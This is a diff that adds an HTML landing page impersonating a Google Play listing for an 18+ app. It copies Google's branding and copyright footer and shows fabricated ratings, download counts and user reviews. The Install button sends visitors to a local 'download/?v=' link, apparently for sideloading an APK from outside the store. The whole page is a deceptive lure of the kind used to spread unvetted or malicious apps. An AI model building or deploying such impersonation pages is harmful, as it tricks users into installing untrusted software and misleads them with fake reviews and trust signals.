@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <base href="/landing-pages/gplayx/">
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Google Play - App Download</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#121212;
+  --surface:#1e1e1e;
+  --card:#2a2a2a;
+  --border:#333;
+  --text:#e0e0e0;
+  --text-secondary:#999;
+  --accent:#3ddc84;
+  --accent-dark:#2bb868;
+  --star:#fdd835;
+  --green-bar:#3ddc84;
+}
+html{font-size:16px}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  max-width:480px;
+  margin:0 auto;
+  min-height:100vh;
+  -webkit-font-smoothing:antialiased;
+}
+
+/* Top Nav */
+.topbar{
+  display:flex;
+  align-items:center;
+  padding:12px 16px;
+  background:var(--surface);
+  position:sticky;
+  top:0;
+  z-index:100;
+  border-bottom:1px solid var(--border);
+}
+.topbar svg{flex-shrink:0}
+.topbar-title{
+  flex:1;
+  text-align:center;
+  font-size:16px;
+  font-weight:500;
+  color:var(--text);
+  letter-spacing:.3px;
+}
+.topbar-logo{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  flex:1;
+}
+.topbar-logo svg{width:24px;height:24px}
+.topbar-logo span{font-size:16px;color:var(--text);font-weight:500}
+.topbar-actions{display:flex;gap:16px;align-items:center}
+.topbar-actions svg{cursor:pointer;opacity:.8}
+
+/* App Header */
+.app-header{
+  display:flex;
+  align-items:flex-start;
+  padding:20px 16px;
+  gap:16px;
+}
+.app-icon{
+  width:80px;
+  height:80px;
+  border-radius:20px;
+  object-fit:cover;
+  flex-shrink:0;
+  box-shadow:0 2px 12px rgba(0,0,0,.4);
+}
+.app-info{flex:1;padding-top:4px}
+.app-name{
+  font-size:22px;
+  font-weight:600;
+  color:#fff;
+  line-height:1.3;
+}
+.app-developer{
+  font-size:14px;
+  color:var(--accent);
+  margin-top:4px;
+  font-weight:500;
+}
+.app-tag{
+  font-size:12px;
+  color:var(--text-secondary);
+  margin-top:4px;
+}
+
+/* Stats Row */
+.stats-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-around;
+  padding:12px 16px;
+  margin:0 16px;
+  background:var(--surface);
+  border-radius:12px;
+  border:1px solid var(--border);
+}
+.stat-item{
+  text-align:center;
+  flex:1;
+}
+.stat-value{
+  font-size:14px;
+  font-weight:600;
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:3px;
+}
+.stat-value .star{color:var(--star);font-size:13px}
+.stat-label{
+  font-size:11px;
+  color:var(--text-secondary);
+  margin-top:2px;
+}
+.stat-divider{
+  width:1px;
+  height:28px;
+  background:var(--border);
+}
+
+/* Install Button */
+.install-section{padding:16px}
+.install-btn{
+  display:block;
+  width:100%;
+  padding:14px;
+  background:var(--accent);
+  color:#000;
+  border:none;
+  border-radius:8px;
+  font-size:15px;
+  font-weight:600;
+  cursor:pointer;
+  text-align:center;
+  text-decoration:none;
+  transition:background .2s;
+  letter-spacing:.3px;
+}
+.install-btn:active{background:var(--accent-dark)}
+.install-hint{
+  text-align:center;
+  font-size:11px;
+  color:var(--text-secondary);
+  margin-top:6px;
+}
+
+/* Section Titles */
+.section{padding:20px 16px 8px}
+.section-header{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  margin-bottom:14px;
+}
+.section-title{
+  font-size:17px;
+  font-weight:600;
+  color:#fff;
+}
+.section-arrow{
+  color:var(--text-secondary);
+  font-size:20px;
+  text-decoration:none;
+}
+
+/* Screenshots Carousel */
+.screenshots-wrapper{position:relative;margin:0 16px 8px}
+.screenshots{
+  display:flex;
+  gap:10px;
+  overflow-x:auto;
+  scroll-snap-type:x mandatory;
+  -webkit-overflow-scrolling:touch;
+  scrollbar-width:none;
+  scroll-behavior:smooth;
+}
+.screenshots::-webkit-scrollbar{display:none}
+.screenshot-item{
+  flex-shrink:0;
+  scroll-snap-align:center;
+}
+.screenshot-item img{
+  width:200px;
+  height:356px;
+  object-fit:cover;
+  border-radius:12px;
+  border:1px solid var(--border);
+  transition:transform .3s,opacity .3s;
+}
+.screenshot-item.active img{
+  transform:scale(1.03);
+  border-color:var(--accent);
+}
+.carousel-dots{
+  display:flex;
+  justify-content:center;
+  gap:6px;
+  margin-top:12px;
+}
+.carousel-dot{
+  width:6px;
+  height:6px;
+  border-radius:50%;
+  background:var(--border);
+  transition:all .3s;
+}
+.carousel-dot.active{
+  background:var(--accent);
+  width:18px;
+  border-radius:3px;
+}
+
+/* About */
+.about-text{
+  font-size:14px;
+  line-height:1.7;
+  color:var(--text-secondary);
+}
+
+/* Tags */
+.tag-row{
+  display:flex;
+  gap:8px;
+  flex-wrap:wrap;
+  margin-top:12px;
+}
+.tag{
+  padding:6px 14px;
+  border-radius:20px;
+  border:1px solid var(--border);
+  font-size:12px;
+  color:var(--text-secondary);
+  background:var(--surface);
+}
+
+/* Data Safety */
+.safety-card{
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:16px;
+  margin:0 16px;
+}
+.safety-item{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  padding:10px 0;
+}
+.safety-item:not(:last-child){border-bottom:1px solid var(--border)}
+.safety-icon{
+  width:36px;
+  height:36px;
+  border-radius:50%;
+  background:var(--card);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-shrink:0;
+}
+.safety-icon svg{width:18px;height:18px;color:var(--text-secondary)}
+.safety-text{font-size:13px;color:var(--text-secondary);line-height:1.5}
+.safety-text strong{color:var(--text);font-weight:500}
+
+/* Ratings */
+.rating-block{
+  display:flex;
+  align-items:center;
+  gap:24px;
+  margin-bottom:16px;
+}
+.rating-big{text-align:center}
+.rating-number{
+  font-size:48px;
+  font-weight:300;
+  color:#fff;
+  line-height:1;
+}
+.rating-stars{
+  display:flex;
+  gap:2px;
+  justify-content:center;
+  margin-top:6px;
+}
+.rating-stars span{color:var(--star);font-size:14px}
+.rating-count{
+  font-size:12px;
+  color:var(--text-secondary);
+  margin-top:4px;
+}
+.rating-bars{flex:1}
+.bar-row{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  margin-bottom:4px;
+}
+.bar-label{
+  font-size:12px;
+  color:var(--text-secondary);
+  width:10px;
+  text-align:right;
+}
+.bar-track{
+  flex:1;
+  height:8px;
+  background:var(--card);
+  border-radius:4px;
+  overflow:hidden;
+}
+.bar-fill{
+  height:100%;
+  background:var(--green-bar);
+  border-radius:4px;
+}
+
+/* Reviews */
+.review-card{
+  background:var(--surface);
+  border-radius:12px;
+  padding:14px;
+  margin-bottom:10px;
+  border:1px solid var(--border);
+}
+.review-top{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:8px;
+}
+.review-avatar{
+  width:32px;
+  height:32px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:14px;
+  font-weight:600;
+  color:#fff;
+  flex-shrink:0;
+}
+.review-name{font-size:13px;color:var(--text);font-weight:500}
+.review-meta{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  margin-bottom:6px;
+}
+.review-stars span{color:var(--star);font-size:12px}
+.review-date{font-size:12px;color:var(--text-secondary)}
+.review-text{
+  font-size:13px;
+  color:var(--text-secondary);
+  line-height:1.6;
+}
+
+/* Similar Apps */
+.similar-row{
+  display:flex;
+  gap:16px;
+  overflow-x:auto;
+  padding:0 16px 8px;
+  scrollbar-width:none;
+}
+.similar-row::-webkit-scrollbar{display:none}
+.similar-item{
+  flex-shrink:0;
+  text-align:center;
+  width:72px;
+}
+.similar-icon{
+  width:56px;
+  height:56px;
+  border-radius:14px;
+  margin:0 auto 6px;
+  object-fit:cover;
+  border:1px solid var(--border);
+}
+.similar-name{
+  font-size:11px;
+  color:var(--text-secondary);
+  line-height:1.3;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+}
+.similar-rating{
+  font-size:10px;
+  color:var(--text-secondary);
+  margin-top:2px;
+}
+
+/* Footer */
+.footer{
+  padding:24px 16px 40px;
+  border-top:1px solid var(--border);
+  margin-top:16px;
+}
+.footer-links{
+  display:flex;
+  flex-wrap:wrap;
+  gap:8px 20px;
+  margin-bottom:12px;
+}
+.footer-links a{
+  font-size:12px;
+  color:var(--text-secondary);
+  text-decoration:none;
+}
+.footer-copy{
+  font-size:11px;
+  color:#666;
+  margin-top:8px;
+}
+.google-play-footer{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  margin-bottom:12px;
+}
+.google-play-footer img{height:18px}
+.google-play-footer span{
+  font-size:14px;
+  color:var(--text-secondary);
+  font-weight:500;
+}
+
+/* Divider */
+.divider{
+  height:1px;
+  background:var(--border);
+  margin:0 16px;
+}
+
+/* Animations */
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.app-header,.stats-row,.install-section,.section,.screenshots,.safety-card,.review-card,.similar-row{
+  animation:fadeIn .4s ease both;
+}
+</style>
+  <script src="/landing-runtime.js" defer></script>
+</head>
+<body>
+
+<!-- Top Navigation Bar -->
+<div class="topbar">
+  <div class="topbar-logo">
+    <svg viewbox="0 0 24 24" fill="none">
+      <path d="M3.609 1.814L13.792 12 3.61 22.186a2.372 2.372 0 01-.61-1.618V3.432c0-.624.228-1.178.609-1.618z" fill="#4285F4"></path>
+      <path d="M17.556 8.222L13.792 12l3.764 3.778 4.249-2.406c.958-.543.958-1.901 0-2.444l-4.25-2.706z" fill="#FBBC04"></path>
+      <path d="M3.609 22.186c.5.563 1.238.848 2.014.624l8.17-4.632L10.03 14.4 3.61 22.186z" fill="#EA4335"></path>
+      <path d="M13.792 8.222L5.623 3.19C4.847 2.966 4.109 3.251 3.61 3.814L10.03 9.6l3.763-1.378z" fill="#34A853"></path>
+    </svg>
+    <span>Google Play</span>
+  </div>
+  <div class="topbar-actions">
+    <svg width="22" height="22" viewbox="0 0 24 24" fill="none" stroke="#999" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.35-4.35"></path></svg>
+    <svg width="22" height="22" viewbox="0 0 24 24" fill="none" stroke="#999" stroke-width="2"><circle cx="12" cy="5" r="1.5"></circle><circle cx="12" cy="12" r="1.5"></circle><circle cx="12" cy="19" r="1.5"></circle></svg>
+  </div>
+</div>
+
+<!-- App Header -->
+<div class="app-header">
+  <img class="app-icon" src="static/picture/LOGO.jpg" alt="App Icon">
+  <div class="app-info">
+    <div class="app-name">Porn hub</div>
+    <div class="app-developer">Developer Studio</div>
+    <div class="app-tag">Contains ads · In-app purchases</div>
+  </div>
+</div>
+
+<!-- Stats Row -->
+<div class="stats-row">
+  <div class="stat-item">
+    <div class="stat-value">4.8 <span class="star">★</span></div>
+    <div class="stat-label">128K reviews</div>
+  </div>
+  <div class="stat-divider"></div>
+  <div class="stat-item">
+    <div class="stat-value">10M+</div>
+    <div class="stat-label">Downloads</div>
+  </div>
+  <div class="stat-divider"></div>
+  <div class="stat-item">
+    <div class="stat-value">
+      <svg width="16" height="16" viewbox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"></rect><path d="M9 9h6M9 13h4"></path></svg>
+    </div>
+    <div class="stat-label">Rated 18+</div>
+  </div>
+</div>
+
+<!-- Install Button -->
+<div class="install-section">
+  <a href="#" id="downloadBtn" class="install-btn" onclick="downloadAPK(event)">Install</a>
+  <div class="install-hint">Free · Requires Android 8.0+</div>
+</div>
+
+<div class="divider"></div>
+
+<!-- Screenshots -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-title">Screenshots</div>
+    <span class="section-arrow">›</span>
+  </div>
+</div>
+<div class="screenshots-wrapper">
+  <div class="screenshots" id="screenshotCarousel">
+    <div class="screenshot-item"><img src="static/picture/1.jpg" alt="Screenshot 1"></div>
+    <div class="screenshot-item"><img src="static/picture/2.jpg" alt="Screenshot 2"></div>
+    <div class="screenshot-item"><img src="static/picture/3.jpg" alt="Screenshot 3"></div>
+    <div class="screenshot-item"><img src="static/picture/4.jpg" alt="Screenshot 4"></div>
+    <div class="screenshot-item"><img src="static/picture/5.jpg" alt="Screenshot 5"></div>
+    <div class="screenshot-item"><img src="static/picture/6.jpg" alt="Screenshot 6"></div>
+  </div>
+  <div class="carousel-dots" id="carouselDots">
+    <div class="carousel-dot active"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+    <div class="carousel-dot"></div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- About this app -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-title">About this app</div>
+    <span class="section-arrow">›</span>
+  </div>
+  <div class="about-text">
+    A powerful and intuitive application designed to enhance your daily experience. 
+    Discover amazing features, connect with others, and enjoy a seamless user interface 
+    that makes everything easier.
+  </div>
+  <div class="tag-row">
+    <span class="tag">Social</span>
+    <span class="tag">Communication</span>
+    <span class="tag">Lifestyle</span>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- Data Safety -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-title">Data safety</div>
+    <span class="section-arrow">›</span>
+  </div>
+</div>
+<div class="safety-card">
+  <div class="safety-item">
+    <div class="safety-icon">
+      <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+    </div>
+    <div class="safety-text"><strong>Data encryption</strong><br>Your data is transferred over a secure connection</div>
+  </div>
+  <div class="safety-item">
+    <div class="safety-icon">
+      <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M3 12h18M3 18h18"></path></svg>
+    </div>
+    <div class="safety-text"><strong>Data collection</strong><br>No data shared with third parties</div>
+  </div>
+  <div class="safety-item">
+    <div class="safety-icon">
+      <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0110 0v4"></path></svg>
+    </div>
+    <div class="safety-text"><strong>You can request data deletion</strong><br>Developer provides a way to request data deletion</div>
+  </div>
+</div>
+
+<div class="divider" style="margin-top:20px"></div>
+
+<!-- Ratings and Reviews -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-title">Ratings and reviews</div>
+    <span class="section-arrow">›</span>
+  </div>
+  <div class="rating-block">
+    <div class="rating-big">
+      <div class="rating-number">4.8</div>
+      <div class="rating-stars">
+        <span>★</span><span>★</span><span>★</span><span>★</span><span>★</span>
+      </div>
+      <div class="rating-count">128K reviews</div>
+    </div>
+    <div class="rating-bars">
+      <div class="bar-row"><span class="bar-label">5</span><div class="bar-track"><div class="bar-fill" style="width:78%"></div></div></div>
+      <div class="bar-row"><span class="bar-label">4</span><div class="bar-track"><div class="bar-fill" style="width:15%"></div></div></div>
+      <div class="bar-row"><span class="bar-label">3</span><div class="bar-track"><div class="bar-fill" style="width:4%"></div></div></div>
+      <div class="bar-row"><span class="bar-label">2</span><div class="bar-track"><div class="bar-fill" style="width:2%"></div></div></div>
+      <div class="bar-row"><span class="bar-label">1</span><div class="bar-track"><div class="bar-fill" style="width:1%"></div></div></div>
+    </div>
+  </div>
+
+  <!-- Review 1 -->
+  <div class="review-card">
+    <div class="review-top">
+      <div class="review-avatar" style="background:#5c6bc0">A</div>
+      <div class="review-name">Alex Johnson</div>
+    </div>
+    <div class="review-meta">
+      <div class="review-stars"><span>★★★★★</span></div>
+      <div class="review-date">April 20, 2026</div>
+    </div>
+    <div class="review-text">Absolutely love this app! The interface is so smooth and intuitive. Been using it daily for the past month and it keeps getting better with every update.</div>
+  </div>
+
+  <!-- Review 2 -->
+  <div class="review-card">
+    <div class="review-top">
+      <div class="review-avatar" style="background:#26a69a">S</div>
+      <div class="review-name">Sarah Miller</div>
+    </div>
+    <div class="review-meta">
+      <div class="review-stars"><span>★★★★★</span></div>
+      <div class="review-date">April 15, 2026</div>
+    </div>
+    <div class="review-text">Great features and very reliable. The customer support team is also very responsive. Highly recommended for everyone!</div>
+  </div>
+
+  <!-- Review 3 -->
+  <div class="review-card">
+    <div class="review-top">
+      <div class="review-avatar" style="background:#ef5350">M</div>
+      <div class="review-name">Mike Chen</div>
+    </div>
+    <div class="review-meta">
+      <div class="review-stars"><span>★★★★</span><span style="color:#555">★</span></div>
+      <div class="review-date">April 10, 2026</div>
+    </div>
+    <div class="review-text">Very useful app with tons of features. Works perfectly on my device. Would love to see more customization options in future updates.</div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- What's New -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-title">What's new</div>
+  </div>
+  <div class="about-text">
+    <strong style="color:var(--text)">v3.2.1</strong> · April 2026<br><br>
+    • Performance improvements and bug fixes<br>
+    • Enhanced user interface<br>
+    • New features added<br>
+    • Improved stability
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- Similar Apps -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-title">Similar apps</div>
+    <span class="section-arrow">›</span>
+  </div>
+</div>
+<div class="similar-row">
+  <div class="similar-item">
+    <div class="similar-icon" style="background:linear-gradient(135deg,#667eea,#764ba2)"></div>
+    <div class="similar-name">AppOne</div>
+    <div class="similar-rating">4.6 ★</div>
+  </div>
+  <div class="similar-item">
+    <div class="similar-icon" style="background:linear-gradient(135deg,#f093fb,#f5576c)"></div>
+    <div class="similar-name">AppTwo</div>
+    <div class="similar-rating">4.4 ★</div>
+  </div>
+  <div class="similar-item">
+    <div class="similar-icon" style="background:linear-gradient(135deg,#4facfe,#00f2fe)"></div>
+    <div class="similar-name">AppThree</div>
+    <div class="similar-rating">4.7 ★</div>
+  </div>
+  <div class="similar-item">
+    <div class="similar-icon" style="background:linear-gradient(135deg,#43e97b,#38f9d7)"></div>
+    <div class="similar-name">AppFour</div>
+    <div class="similar-rating">4.3 ★</div>
+  </div>
+  <div class="similar-item">
+    <div class="similar-icon" style="background:linear-gradient(135deg,#fa709a,#fee140)"></div>
+    <div class="similar-name">AppFive</div>
+    <div class="similar-rating">4.5 ★</div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="google-play-footer">
+    <svg width="20" height="20" viewbox="0 0 24 24" fill="none">
+      <path d="M3.609 1.814L13.792 12 3.61 22.186a2.372 2.372 0 01-.61-1.618V3.432c0-.624.228-1.178.609-1.618z" fill="#4285F4"></path>
+      <path d="M17.556 8.222L13.792 12l3.764 3.778 4.249-2.406c.958-.543.958-1.901 0-2.444l-4.25-2.706z" fill="#FBBC04"></path>
+      <path d="M3.609 22.186c.5.563 1.238.848 2.014.624l8.17-4.632L10.03 14.4 3.61 22.186z" fill="#EA4335"></path>
+      <path d="M13.792 8.222L5.623 3.19C4.847 2.966 4.109 3.251 3.61 3.814L10.03 9.6l3.763-1.378z" fill="#34A853"></path>
+    </svg>
+    <span>Google Play</span>
+  </div>
+  <div class="footer-links">
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy</a>
+    <a href="#">About Google Play</a>
+    <a href="#">Developers</a>
+    <a href="#">Google Store</a>
+  </div>
+  <div class="footer-copy">© 2026 Google LLC. All rights reserved.</div>
+</div>
+
+<script>
+// =============================================
+// 修改后的下载函数
+// =============================================
+function downloadAPK(e) {
+  e.preventDefault();
+  // 获取当前时间戳
+  var timestamp = new Date().getTime();
+  // 构建跳转链接 download.php?v=时间戳
+  var downloadUrl = "download/?v=" + timestamp;
+  
+  window.location.href = downloadUrl;
+}
+// =============================================
+
+// Screenshot Carousel Auto-scroll
+(function() {
+  var carousel = document.getElementById('screenshotCarousel');
+  var dots = document.querySelectorAll('#carouselDots .carousel-dot');
+  var items = carousel.querySelectorAll('.screenshot-item');
+  var current = 0;
+  var total = items.length;
+  var autoTimer = null;
+  var INTERVAL = 3000;
+
+  function scrollToIndex(idx) {
+    current = idx;
+    var item = items[idx];
+    if(!item) return;
+    var scrollLeft = item.offsetLeft - (carousel.offsetWidth / 2) + (item.offsetWidth / 2);
+    carousel.scrollTo({ left: scrollLeft, behavior: 'smooth' });
+    updateDots();
+    updateActive();
+  }
+
+  function updateDots() {
+    dots.forEach(function(d, i) {
+      d.classList.toggle('active', i === current);
+    });
+  }
+
+  function updateActive() {
+    items.forEach(function(it, i) {
+      it.classList.toggle('active', i === current);
+    });
+  }
+
+  function nextSlide() {
+    var next = (current + 1) % total;
+    scrollToIndex(next);
+  }
+
+  function startAuto() {
+    stopAuto();
+    autoTimer = setInterval(nextSlide, INTERVAL);
+  }
+
+  function stopAuto() {
+    if (autoTimer) { clearInterval(autoTimer); autoTimer = null; }
+  }
+
+  carousel.addEventListener('touchstart', stopAuto);
+  carousel.addEventListener('touchend', function() { setTimeout(startAuto, 4000); });
+  carousel.addEventListener('mouseenter', stopAuto);
+  carousel.addEventListener('mouseleave', function() { setTimeout(startAuto, 2000); });
+
+  var scrollTimeout;
+  carousel.addEventListener('scroll', function() {
+    clearTimeout(scrollTimeout);
+    scrollTimeout = setTimeout(function() {
+      var center = carousel.scrollLeft + carousel.offsetWidth / 2;
+      var closest = 0;
+      var minDist = Infinity;
+      items.forEach(function(item, i) {
+        var itemCenter = item.offsetLeft + item.offsetWidth / 2;
+        var dist = Math.abs(center - itemCenter);
+        if (dist < minDist) { minDist = dist; closest = i; }
+      });
+      current = closest;
+      updateDots();
+      updateActive();
+    }, 100);
+  });
+
+  dots.forEach(function(dot, i) {
+    dot.addEventListener('click', function() {
+      stopAuto();
+      scrollToIndex(i);
+      setTimeout(startAuto, 4000);
+    });
+  });
+
+  updateActive();
+  startAuto();
+})();
+</script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v3d52b47920f24c319d37e2661827c42b1787588026925" integrity="sha512-d9sL6GJLXn6fInD1+TVXhTcQOsmxeHfmHAvwGDIxp5TO+uo1fiWW7mHomMj4MLRlCsJDTqXzWLHJFFlPCEIj/A==" data-cf-beacon='{"version":"2024.11.0","token":"d8d0a4b6e3294b56990fe4f7e7e0a13a","r":1}' crossorigin="anonymous"></script>
+</body>
+</html>
